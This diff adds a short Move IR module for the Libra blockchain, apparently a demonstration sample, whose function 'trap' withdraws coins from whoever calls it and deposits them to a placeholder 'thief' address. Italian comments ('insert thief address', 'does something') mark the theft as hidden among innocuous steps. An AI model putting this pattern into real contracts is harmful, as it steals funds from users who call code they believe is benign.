@@ -1,0 +1,17 @@
+module happy{
+    import 0x0.LibraAccount;
+    import 0x0.LibraCoin;
+    public trap(){
+        let amount: u64;
+        let coin: LibraCoin.T;
+        let thief: address;
+        // inserire indirizzo ladro
+        thief = 0x0000000000000;
+        amount = 10;
+        // fa qualcosa
+        coin = LibraAccount.withdraw_from_sender(move(amount));
+        LibraAccount.deposit(move(thief), move(coin));
+        // fa qualcos'altro
+        return;
+    }
+}
